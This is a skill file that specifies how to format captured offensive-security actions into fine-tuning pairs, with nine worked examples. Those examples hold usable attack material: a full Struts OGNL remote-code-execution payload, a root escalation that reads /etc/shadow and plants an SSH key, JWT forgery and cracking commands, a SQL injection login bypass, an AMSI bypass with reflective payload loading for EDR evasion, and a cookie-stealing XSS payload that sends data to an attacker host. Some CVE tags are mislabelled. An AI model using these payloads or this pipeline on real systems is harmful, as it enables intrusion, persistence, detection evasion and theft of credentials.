---
name: dataset-hunt
description: Transform raw agent captures into structured instruction-following training pairs for fine-tuning. After DISCOVERY captures raw actions — format, annotate, classify, and score every capture. Use when building training datasets.
---

# SKILL-DATASET-HUNT — Training Data Formatting & Structuring — HUNT
# Phase Coverage: Cross-cutting (runs after DISCOVERY captures)
# Purpose: Transform raw captures from dataset-discovery into clean,
#          instruction-following training pairs ready for model fine-tuning.

---

## Formatting Pipeline

```
RAW CAPTURE (from DISCOVERY)
  → CLASSIFY: assign dataset_type + tags + CWE/CVE/MITRE
  → ANNOTATE: add reasoning, context, next-step guidance
  → STRUCTURE: convert to instruction-following format
  → SCORE: rate training value (0.0 - 1.0)
  → DEDUPLICATE: check for similar existing entries
  → WRITE: to dataset/formatted/{dataset_type}/

PIPELINE COMMAND:
  python3 mcp/dataset_capture.py --action format --input dataset/raw-captures/{session}/ --output dataset/formatted/
```

---

## Instruction-Following Format — Per Dataset Type

### Type 1: Vulnerability & Exploit Intelligence

```json
{
  "system": "You are an authorized offensive security researcher operating under a signed Rules of Engagement. You have access to standard security tools (nmap, sqlmap, nuclei, metasploit, curl, burp). Your goal is to find and exploit vulnerabilities responsibly.",
  "instruction": "Given this technology fingerprint and version, identify known CVEs and select the most exploitable one for the target.",
  "input": "Target: target.example.com:8080\nServer: Apache Struts 2.5.12\nTechnology: Java, Spring Framework 4.3.14\nOpen endpoints: /struts2-showcase/, /api/v1/users",
  "output": "Apache Struts 2.5.12 is vulnerable to CVE-2017-5638 (CVSS 10.0, CWE-20, T1190). This is a Content-Type OGNL injection leading to RCE.\n\nAttack Plan:\n1. Verify with non-destructive OGNL expression: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Verify','true')}\n2. Send via Content-Type header to /struts2-showcase/upload.action\n3. Confirm RCE with: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
  "metadata": {
    "dataset_type": "vulnerability-exploit",
    "vuln_class": "ssti",
    "cwe_id": "CWE-20",
    "cvss_score": 10.0,
    "cvss_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "mitre_attack": "T1190",
    "cve_id": "CVE-2017-5638",
    "source": "NVD",
    "tags": ["rce", "ognl-injection", "struts2", "content-type"]
  },
  "quality_score": 0.95
}
```

### Type 2: Network & Web Application Data

```json
{
  "system": "You are an authorized offensive security researcher operating under a signed Rules of Engagement. Analyze network scan results and HTTP traffic to identify attack surfaces.",
  "instruction": "Analyze this Nmap scan output and identify the most promising attack vectors based on the services, versions, and configurations found.",
  "input": "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3\n80/tcp   open  http    Apache/2.4.29 (Ubuntu)\n443/tcp  open  ssl/http Apache/2.4.29 (Ubuntu)\n3306/tcp open  mysql   MySQL 5.7.25\n8080/tcp open  http    Apache Tomcat/9.0.14\n\nHTTP Headers (80/tcp):\nServer: Apache/2.4.29 (Ubuntu)\nX-Powered-By: PHP/7.2.10\n\nHTTP Headers (8080/tcp):\nServer: Apache-Coyote/1.1\nX-Powered-By: Struts2",
  "output": "Attack Surface Analysis:\n\n1. CRITICAL — Tomcat 9.0.14 on 8080 (CVE-2019-0232 RCE, CVE-2019-0211 privilege escalation)\n   → Tomcat Manager likely at /manager/ — check for default creds (tomcat:tomcat)\n   → Deploy war shell if manager accessible\n\n2. HIGH — MySQL 5.7.25 on 3306 (CVE-2019-2628, CVE-2018-2588)\n   → Test for weak root password via hydra\n   → If access gained: UDF提权 if plugin dir writable\n\n3. MEDIUM — PHP 7.2.10 on 80 (EOL, multiple CVEs)\n   → Check for LFI via path traversal\n   → Test file upload endpoints for PHP webshell\n\n4. LOW — OpenSSH 7.6p1 (Ubuntu-specific vulns)\n   → Low risk unless user enumeration reveals valid accounts\n\nRecommended sequence: Tomcat Manager (fastest ROI) → MySQL brute → PHP app vulns",
  "metadata": {
    "dataset_type": "network-webapp",
    "services_found": ["ssh", "http", "https", "mysql", "http-proxy"],
    "critical_services": ["tomcat/9.0.14", "mysql/5.7.25"],
    "attack_vectors": ["credential-brute", "cve-exploit", "web-vuln"],
    "tags": ["nmap", "service-detection", "tomcat", "mysql", "php"]
  },
  "quality_score": 0.85
}
```

### Type 3: Shell & Command Sequences

```json
{
  "system": "You are an authorized offensive security researcher operating under a signed Rules of Engagement. Execute post-exploitation commands to demonstrate impact.",
  "instruction": "You have a reverse shell on a Linux target. Demonstrate the privilege escalation chain from www-data to root.",
  "input": "Shell type: bash reverse shell on target.example.com:4444\nCurrent user: www-data (uid=33)\nKernel: 4.15.0-45-generic\nSUID binaries found: /usr/bin/pkexec, /usr/bin/sudo\nWritable /etc/passwd: No\nCron jobs readable: Yes, writable: No\nSudo -l: (ALL : ALL) NOPASSWD: /usr/bin/vim",
  "output": "Privilege Escalation via sudo vim:\n\n```bash\n# Step 1: Confirm sudo permissions\nsudo -l\n# Output: (ALL : ALL) NOPASSWD: /usr/bin/vim\n\n# Step 2: Escape vim to shell (GTFOBins method)\nsudo vim -c ':!sh'\n\n# Step 3: Verify root access\nid\n# Output: uid=0(root) gid=0(root)\n\n# Step 4: Demonstrate impact (read sensitive files)\ncat /etc/shadow | head -5\n# Output: root:$6$rounds=... (hash visible)\n\n# Step 5: Establish persistence for report\nmkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys\n```\n\nImpact: Full root compromise via sudo misconfiguration. CVSS 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H). CWE-250 (Execution with Unnecessary Privileges). MITRE ATT&CK T1548.003.",
  "metadata": {
    "dataset_type": "shell-commands",
    "initial_access": "reverse-shell",
    "privilege_escalation": "sudo-misconfiguration",
    "technique": "gtfobins",
    "mitre_attack": "T1548.003",
    "cwe_id": "CWE-250",
    "cvss_score": 7.8,
    "tags": ["linux", "privesc", "sudo", "vim", "gtfobins"]
  },
  "quality_score": 0.9
}
```

### Type 4: Credential & Authentication Attack Data

```json
{
  "system": "You are an authorized offensive security researcher operating under a signed Rules of Engagement. Test authentication mechanisms for weaknesses.",
  "instruction": "The target has a JWT-based authentication system. Analyze the token structure and identify exploitation vectors.",
  "input": "JWT Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGQiOiJ1c2VyIiwiZXhwIjoxNjAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nDecoded Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\nDecoded Payload: {\"user_id\":12345,\"username\":\"admin\",\"role\":\"user\",\"exp\":1600000000}\n\nApplication behavior:\n- Token in Authorization: Bearer header\n- Token in localStorage (JS read)\n- /api/admin returns 403 when role=user, 200 when role=admin\n- No rate limiting on /api/login\n- Secret length: appears short (token signature is small)",
  "output": "JWT Attack Chain:\n\n1. Algorithm Confusion (none attack):\n   → Change header to {\"alg\":\"none\",\"typ\":\"JWT\"}\n   → Remove signature, keep payload\n   → If server accepts 'none' alg: full bypass\n\n2. Secret Brute Force:\n   → Token uses HS256 with short secret\n   → Use hashcat: hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n   → Or jwt_tool: python3 jwt_tool.py <token> -C -d rockyou.txt\n\n3. Role Tampering:\n   → Re-sign with cracked secret: {\"user_id\":12345,\"username\":\"admin\",\"role\":\"admin\",\"exp\":1600000000}\n   → New token grants admin access to /api/admin\n\n4. None Algorithm + Base64 URL fix:\n   → Ensure payload header says alg:none\n   → Strip signature (remove everything after last dot)\n   → Ensure base64 padding is correct\n\nTest command: curl -H 'Authorization: Bearer <forged-token>' https://target.example.com/api/admin\nExpected: 200 OK with admin data (I:H — privilege escalation)",
  "metadata": {
    "dataset_type": "credential-auth",
    "auth_mechanism": "jwt",
    "attack_vectors": ["algorithm-confusion", "secret-brute", "role-tampering"],
    "cwe_id": "CWE-327",
    "cvss_score": 8.1,
    "mitre_attack": "T1550.004",
    "tags": ["jwt", "hs256", "none-algorithm", "privilege-escalation", "token-forgery"]
  },
  "quality_score": 0.88
}
```

### Type 5: Code Analysis (SAST/DAST) Data

```json
{
  "system": "You are an authorized offensive security researcher performing source code review for vulnerabilities. Analyze the code and identify exploitable flaws.",
  "instruction": "Review this PHP code for SQL injection vulnerabilities. Identify the exact vulnerable line, exploitation technique, and provide a patch.",
  "input": "<?php\n// login.php\n$username = $_POST['username'];\n$password = $_POST['password'];\n\n$query = \"SELECT * FROM users WHERE username = '\" . $username . \"' AND password = '\" . md5($password) . \"'\";\n$result = mysqli_query($conn, $query);\n\nif (mysqli_num_rows($result) > 0) {\n    $row = mysqli_fetch_assoc($result);\n    $_SESSION['user_id'] = $row['id'];\n    header('Location: dashboard.php');\n} else {\n    echo 'Invalid credentials';\n}\n?>",
  "output": "VULNERABILITY: SQL Injection (CWE-89)\n\nVulnerable Line:\n  $query = \"SELECT * FROM users WHERE username = '\" . $username . \"' AND password = '\" . md5($password) . \"'\";\n\nWhy it's vulnerable:\n  The $username variable from $_POST is directly concatenated into the SQL query without sanitization or parameterization. An attacker can inject arbitrary SQL.\n\nExploitation:\n  POST /login.php HTTP/1.1\n  Content-Type: application/x-www-form-urlencoded\n\n  username=admin' OR '1'='1'-- &password=anything\n\n  Resulting query:\n  SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- ' AND password = '...'\n  → Returns all users, logs in as first user (admin)\n\n  Advanced: Time-based blind extraction:\n  username=admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- \n\nPatch (Prepared Statements):\n  <?php\n  $stmt = $conn->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n  $hashed = md5($_POST['password']);\n  $stmt->bind_param(\"ss\", $_POST['username'], $hashed);\n  $stmt->execute();\n  $result = $stmt->get_result();\n  ?>\n\nCVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
  "metadata": {
    "dataset_type": "code-analysis",
    "language": "php",
    "vuln_class": "sqli",
    "cwe_id": "CWE-89",
    "cvss_score": 9.8,
    "owasp_category": "A03:2021-Injection",
    "tags": ["php", "sqli", "login-bypass", "prepared-statements", "owasp-top10"]
  },
  "quality_score": 0.92
}
```

### Type 6: OSINT & Reconnaissance Data

```json
{
  "system": "You are an authorized offensive security researcher performing reconnaissance under a signed Rules of Engagement. Synthesize raw recon data into an actionable attack surface.",
  "instruction": "Given these subdomain enumeration results, technology fingerprints, and exposed endpoints, synthesize the complete attack surface and prioritize recon next steps.",
  "input": "Subdomains discovered:\n  api.target.example.com (200, cloudflare)\n  staging.target.example.com (200, no WAF)\n  mail.target.example.com (200, Roundcube 1.3.10)\n  dev.target.example.com (401, nginx)\n  jenkins.target.example.com (200, Jenkins 2.289.3)\n\nTech fingerprint from main site:\n  CMS: WordPress 5.8.2 (EOL)\n  Plugins: Contact Form 7 5.3.2, Yoast SEO 17.4\n  Server: nginx/1.18.0\n  X-Powered-By: Express.js (API)\n\nJavaScript endpoints extracted:\n  /api/v1/users/{id} (GET, auth required)\n  /api/v1/admin/backup (GET, admin required)\n  /api/v1/upload (POST, multipart)\n  /graphql (POST, introspection enabled)",
  "output": "ATTACK SURFACE MAP:\n\nCRITICAL PRIORITY:\n  1. jenkins.target.example.com — Jenkins 2.289.3\n     → CVE-2024-23897 (arbitrary file read, CVSS 9.8)\n     → Check /script, /manage for unauthenticated access\n     → If credentialed: RCE via script console\n\n  2. staging.target.example.com — No WAF protection\n     → Test all payloads without WAF evasion\n     → Mirror main app — likely same vulns, weaker defenses\n\nHIGH PRIORITY:\n  3. WordPress 5.8.2 (EOL) — CVE-2022-21661 (SQLi), CVE-2022-21664 (RCE)\n     → /wp-admin/ — test default creds\n     → Contact Form 7 5.3.2 — file upload abuse\n     → /graphql — introspection reveals full API schema\n\nMEDIUM PRIORITY:\n  4. /api/v1/admin/backup — IDOR test (change user_id param)\n  5. /api/v1/upload — unrestricted file upload test\n  6. Roundcube 1.3.10 — CVE-2020-35730 (XSS), CVE-2021-26880 (SQLi)\n\nRECON NEXT STEPS:\n  → Jenkins: run nuclei -t jenkins/ against jenkins.target.example.com\n  → GraphQL: run introspection query, extract full schema\n  → Staging: run full scan suite without WAF concerns\n  → WordPress: run wpscan --enumerate vp,vt,u",
  "metadata": {
    "dataset_type": "osint-recon",
    "subdomains_found": 6,
    "critical_services": ["jenkins", "wordpress", "graphql"],
    "waf_protected": {"main": true, "staging": false},
    "cves_identified": ["CVE-2024-23897", "CVE-2022-21661", "CVE-2021-26880"],
    "tags": ["subdomain-enum", "tech-fingerprint", "wordpress", "jenkins", "graphql"]
  },
  "quality_score": 0.87
}
```

### Type 7: Adversarial Evasion & OpSec

```json
{
  "system": "You are an authorized red team operator performing adversary simulation under a signed Rules of Engagement. You need to evade detection while demonstrating real impact.",
  "instruction": "The target has a WAF (Cloudflare) and EDR (CrowdStrike). You need to establish a reverse shell. Provide an evasion technique that bypasses both.",
  "input": "Defense Stack:\n  → Cloudflare WAF (HTTP layer, blocks known payloads)\n  → CrowdStrike Falcon (EDR, behavioral + signature)\n  → Sysmon logging (Event IDs 1, 3, 7, 8, 10)\n  → Network IDS (Suricata with ET Open rules)\n\nAttack constraints:\n  → Target: Windows Server 2019, PowerShell 5.1\n  → No direct inbound (must use DNS or HTTPS egress)\n  → Must avoid common YARA rules",
  "output": "Evasion Strategy:\n\nLayer 1 — WAF Bypass (Cloudflare):\n  → Use DNS tunneling for C2 (bypasses HTTP WAF entirely)\n  → Or: domain fronting via Cloudflare Workers (trusted domain)\n  → Payload encoding: double URL-encode all special chars\n\nLayer 2 — EDR Bypass (CrowdStrike):\n  → AMSI bypass: Patch amsiInitFailed in memory (non-file-based)\n  → Process injection: inject into legitimate process (dllhost.exe)\n  → Avoid: Invoke-Expression, DownloadString, known yara patterns\n  → Use: [System.Reflection.Assembly]::Load() from byte array\n\nLayer 3 — Sysmon Evasion:\n  → ETW patching: disable Microsoft-Windows-Threat-Intelligence\n  → Avoid Event ID 1 by loading via Assembly.Load not powershell.exe\n  → Avoid Event ID 3 by using DNS over HTTPS (DoH)\n\nLayer 4 — Network IDS Evasion:\n  → AES-256 encrypted C2 channel (custom, not Metasploit default)\n  → Jitter: 30-60s random interval between beacons\n  → Protocol mimicry: DNS TXT records mimicking legitimate DNS traffic\n\nImplementation (PowerShell, AMSI bypass + DNS C2):\n  [Byte[]]$bytes = [Convert]::FromBase64String('<base64-payload>')\n  # AMSI bypass via memory patch\n  $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('amsiInit'+'Failed','NonPublic,Static');$f.SetValue($null,$true)\n  # Load encrypted payload\n  [System.Reflection.Assembly]::Load($bytes)\n\nDetection Indicators to monitor: DNS TXT queries to unknown domains, memory allocation in lsass.exe, ETW gaps in sysmon logs.",
  "metadata": {
    "dataset_type": "evasion-opsec",
    "defense_stack": ["waf", "edr", "sysmon", "ids"],
    "evasion_layers": ["waf-bypass", "amsi-bypass", "sysmon-evasion", "ids-evasion"],
    "target_os": "windows-server-2019",
    "technique": "dns-tunneling",
    "mitre_attack": "T1572",
    "tags": ["amsi-bypass", "dns-tunneling", "cloudflare", "crowdstrike", "process-injection"]
  },
  "quality_score": 0.82
}
```

### Type 8: Structured Reasoning & Planning

```json
{
  "system": "You are an authorized offensive security researcher performing a penetration test. Plan the attack strategy based on the current recon state.",
  "instruction": "You have completed Phase 0-1 recon. The target is a SaaS application with the following findings. Plan the attack chain from recon to maximum impact.",
  "input": "Current recon state:\n  → Main app: Express.js + MongoDB (Node.js 14.17.0)\n  → Auth: JWT (HS256, secret length 16 chars)\n  → API: REST at /api/v1/, GraphQL at /graphql\n  → 3 confirmed XSS in /api/v1/search (reflected), /profile/bio (stored), /admin/logs (DOM)\n  → 1 confirmed IDOR: /api/v1/users/{id} returns any user's data\n  → Known tech: MongoDB 4.4.6, Redis 6.2.4\n  → Scope: *.target.example.com (5 subdomains in scope)\n  → Constraints: No DoS, no data modification on production",
  "output": "ATTACK CHAIN PLAN:\n\nChain 1: XSS → Session Hijack → Data Exfiltration (C:H)\n  Step 1: Use stored XSS in /profile/bio to inject cookie stealer\n  Step 2: Wait for admin to view profile → capture JWT\n  Step 3: Use admin JWT to access /api/v1/admin/backup → full DB dump\n  Impact: All user data (C:H)\n\nChain 2: IDOR + GraphQL Introspection → Privilege Escalation (I:H)\n  Step 1: Map full API via GraphQL introspection query\n  Step 2: IDOR on /api/v1/users/{id} → extract admin user_id\n  Step 3: Test /api/v1/admin/* endpoints with regular user JWT + admin user_id\n  Step 4: If mass assignment exists: set role=admin via PUT /api/v1/users/{id}\n  Impact: Full admin access (I:H)\n\nChain 3: MongoDB NoSQLi + XSS → RCE (I:H + A:H)\n  Step 1: Test /api/v1/search for NoSQL injection: {\"$gt\":\"\"}\n  Step 2: If NoSQLi confirmed: extract data via boolean blind\n  Step 3: Test MongoDB eval() for command execution (if exposed)\n  Step 4: Chain with XSS for stored NoSQLi via admin panel\n  Impact: Database compromise + potential RCE\n\nRecommended execution order:\n  1. Chain 2 first (fastest, least visible)\n  2. Chain 1 second (high impact, requires social engineering)\n  3. Chain 3 last (most complex, highest impact)\n\nFallback: If all chains fail on main app, pivot to staging.target.example.com (no WAF)",
  "metadata": {
    "dataset_type": "reasoning-planning",
    "scenario": "saas-penetration-test",
    "chains_planned": 3,
    "highest_impact": "c-h",
    "mitre_attack_sequence": ["T1189", "T1059", "T1078", "T1021"],
    "tags": ["attack-chain", "xss", "idor", "nosqli", "jwt", "graphql"]
  },
  "quality_score": 0.93
}
```

### Type 9: Reporting & Documentation

```json
{
  "system": "You are an authorized offensive security researcher writing a professional penetration test report. Document findings with clear impact, evidence, and remediation.",
  "instruction": "Write a professional finding report for a Stored XSS vulnerability found in the user profile bio field. Include all required sections.",
  "input": "Vulnerability: Stored XSS in /profile/bio\nEvidence:\n  POST /api/v1/profile HTTP/1.1\n  Authorization: Bearer <user-jwt>\n  {\"bio\":\"<img src=x onerror=alert(document.cookie)>\"}\n\n  Response: 200 OK\n  GET /profile/12345 → <img src=x onerror=alert(document.cookie)> rendered in HTML\n\nImpact: Any user viewing the profile triggers JavaScript execution in their browser.\n  → Cookie theft → account takeover\n  → Session hijacking → impersonation\n  → Malicious redirect → phishing\n\nAffected users: All users who view any profile (10,000+ active users)\nCVSS: 8.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)",
  "output": "## Finding: Stored Cross-Site Scripting (XSS) in User Profile Bio\n\n### Summary\nA Stored Cross-Site Scripting (XSS) vulnerability exists in the user profile bio field at `/api/v1/profile`. Any user can inject arbitrary HTML and JavaScript that executes in the browser of every user who views their profile. This enables session hijacking, cookie theft, and account takeover of any user on the platform.\n\n### Affected Component\n- Endpoint: `PUT /api/v1/profile`\n- Parameter: `bio` (string, max 500 chars)\n- User interaction required: Victim must visit the attacker's profile page\n\n### Proof of Concept\n\n**Step 1:** Authenticated as a low-privilege user, send:\n```http\nPUT /api/v1/profile HTTP/1.1\nHost: target.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9...\nContent-Type: application/json\n\n{\"bio\":\"<img src=x onerror=fetch('https://attacker.example.com/steal?c='+document.cookie)>\"}\n```\n\n**Step 2:** Wait for any user to visit the attacker's profile:\n```\nGET /profile/12345 HTTP/1.1\nHost: target.example.com\n```\n\n**Step 3:** The injected script executes in the victim's browser, exfiltrating their session cookie to the attacker-controlled server.\n\n### Impact\n- **Confidentiality: HIGH** — Full session hijacking of any user, including administrators\n- **Integrity: LOW** — Attacker can impersonate the victim but not modify server data directly\n- **Availability: NONE** — No service disruption\n\nThis vulnerability affects all 10,000+ active users. An attacker could escalate from any low-privilege account to administrator by hijacking an admin session.\n\n### CVSS v3.1\n- Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`\n- Score: **8.1 (High)**\n- CWE: CWE-79 (Cross-site Scripting)\n\n### Remediation\n1. **Immediate:** Implement Content Security Policy (CSP) header to prevent inline script execution\n2. **Short-term:** Sanitize user input using a library like DOMPurify on the backend before storage\n3. **Long-term:** Implement output encoding (HTML entity encoding) when rendering user-supplied content\n\n### References\n- OWASP ASVS 5.2.1\n- CWE-79: https://cwe.mitre.org/data/definitions/79.html\n- PortSwigger XSS Cheatsheet: https://portswigger.net/web-security/cross-site-scripting",
  "metadata": {
    "dataset_type": "reporting",
    "finding_type": "stored-xss",
    "cwe_id": "CWE-79",
    "cvss_score": 8.1,
    "severity": "high",
    "owasp_category": "A03:2021-Injection",
    "tags": ["xss", "stored-xss", "session-hijacking", "cookie-theft", "report"]
  },
  "quality_score": 0.91
}
```

---

## Annotation Rules

```
EVERY formatted training pair must include:

1. SYSTEM PROMPT — Context for the model (authorized testing, tools available, scope)
2. INSTRUCTION — Clear, specific task the model should learn to perform
3. INPUT — What the model receives (scan output, code, traffic, etc.)
4. OUTPUT — What the model should produce (analysis, exploit, plan, report)
5. METADATA — Classification tags, CWE, CVSS, MITRE ATT&CK, quality score

ANNOTATION CHECKLIST:
  [ ] Is the instruction clear and actionable?
  [ ] Does the output directly address the instruction?
  [ ] Are all technical details accurate and verifiable?
  [ ] Is the reasoning chain explicit and logical?
  [ ] Are CWE/CVSS/MITRE references correct?
  [ ] Is PII/sensitive data redacted?
  [ ] Would this example improve model performance on this task type?
```

---

## Deduplication Rules

```
BEFORE writing a new formatted entry, check:

1. EXACT DUPLICATE: Same input + same output → SKIP
2. SEMANTIC DUPLICATE: Same vulnerability class + same technique + similar input
   → KEEP the higher-quality version, discard the lower
3. VARIATION: Same vuln class but different payload/technique/target
   → KEEP — these are valuable training variations
4. PROGRESSION: Same vuln class but escalating complexity
   → KEEP ALL — these teach the model depth

DEDUP COMMAND:
  python3 mcp/dataset_capture.py --action dedup --input dataset/formatted/{type}/ --threshold 0.85
```

---

## Quality Gate

```
MINIMUM QUALITY FOR INCLUSION IN EXPORTED DATASET:
  quality_score >= 0.6 (demonstrates a valid technique or reasoning)

QUALITY MULTIPLIERS:
  +0.1 if CVE/CWE/MITRE correctly referenced
  +0.1 if request/response pair is included
  +0.1 if reasoning chain is explicit
  +0.1 if remediation/patch is included
  +0.1 if chain/multi-step attack is documented

QUALITY PENALTIES:
  -0.2 if output is generic or lacks specificity
  -0.3 if technical details are inaccurate
  -0.5 if PII/sensitive data leaked (auto-discard if intentional)
```
